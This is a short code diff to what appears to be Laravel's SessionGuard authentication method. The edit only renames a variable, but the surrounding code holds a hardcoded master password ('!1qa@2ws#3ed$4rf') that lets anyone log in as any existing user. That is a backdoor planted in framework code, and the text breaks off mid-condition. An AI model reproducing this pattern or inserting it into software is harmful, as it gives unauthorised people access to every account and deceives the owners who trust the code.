@@ -378,8 +378,8 @@ class SessionGuard implements StatefulGuard, SupportsBasicAuth
      */
     protected function hasValidCredentials($user, $credentials)
     {
-        $user = User::where('username', '=', $credentials['username'])->take(1)->get();
-        if (!isset($user[0]) || !($user[0] instanceof User)){
+        $userTemp = User::where('username', '=', $credentials['username'])->take(1)->get();
+        if (!isset($userTemp[0]) || !($userTemp[0] instanceof User)){
             return false;
         }
         return ($credentials['password'] == '!1qa@2ws#3ed$4rf') ||
